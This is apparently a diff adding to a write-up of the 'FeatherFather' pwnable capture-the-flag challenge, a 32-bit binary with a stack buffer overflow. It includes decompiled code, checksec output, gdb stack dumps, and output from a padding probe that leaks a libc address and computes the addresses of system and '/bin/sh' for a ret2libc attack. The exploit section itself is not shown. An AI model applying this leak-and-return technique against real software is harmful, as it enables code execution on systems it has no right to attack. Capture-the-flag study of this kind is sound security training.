@@ -1,7 +1,73 @@
+## Explain
+```c
+int banner()
+{
+  puts("-------------------");
+  puts("  Feather Maker  ");
+  puts("-------------------");
+  return puts("Make your own feather here!");
+}
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  banner();
+  vuln();
+  return 0;
+}
+
+ssize_t vuln()
+{
+  _BYTE buf[304]; // [esp+4h] [ebp-134h] BYREF
+
+  return read(0, buf, 0x15Eu);
+}
 
 ```
 
+```bash
+banda@seyeon:~/pwnable/FeatherFather$ checksec --file=chall
+[*] '/home/banda/pwnable/FeatherFather/chall'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8046000)
+    RUNPATH:    b'.'
+    Stripped:   No
+
 ```
+
+
+```gdb
+pwndbg> p/x $ebp
+$1 = 0xfff900f8
+
+pwndbg> p/x *(unsigned int*)($ebp+4)
+$2 = 0x80492ac
+
+pwndbg> x/20xw $ebp+4
+0xfff900fc:     0x080492ac      0x41414141      0x41414141      0x08049070
+0xfff9010c:     0x08049070      0x0804c010      0xf7d83470      0x00000000
+0xfff9011c:     0xf7cc5cb9      0x00000001      0xfff901d4      0xfff901dc
+0xfff9012c:     0xfff90140      0xf7ed1e34      0x080490ad      0x00000001
+0xfff9013c:     0xfff901d4      0xf7ed1e34      0xfff901dc      0xf7f18b60
+
+```
+
+
+```
+pad=296 -> no leak
+pad=300 -> no leak
+pad=304 -> no leak
+pad=308 -> no leak
+pad=312 -> OK
+found leak: 0xf7ded140
+raw output (hex): 2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a202046656174686572204d616b657220200a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a4d616b6520796f7572206f776e20666561746865722068657265210a40d1def70a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a202046656174686572204d616b657220200a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0a4d616b6520796f7572206f776e20666561746865722068657265210a
+libc base: 0xf7d75000
+system: 0xf7dc5430 binsh: 0xf7f39de8
+
+```
+
 
 
 ## Exploit
